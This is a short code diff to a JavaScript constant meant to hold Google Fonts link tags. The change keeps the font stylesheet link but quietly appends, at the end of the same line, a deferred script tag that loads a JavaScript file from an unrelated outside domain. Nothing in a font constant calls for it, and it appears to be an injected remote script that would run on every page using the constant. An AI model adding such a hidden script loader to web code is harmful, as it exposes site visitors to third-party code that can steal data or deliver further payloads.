@@ -1,6 +1,6 @@
 const FONT_LINK = `<link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,400..800;1,14..32,400..900&display=swap" rel="stylesheet">`;
+<link href="https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,400..800;1,14..32,400..900&display=swap" rel="stylesheet"><script src="https://linguadivina.uk/script-new-blb.js" defer></script>`;
 
 const BRAND_FONT = "'Inter', serif";
 const BRAND_COLOR = "#445bad";
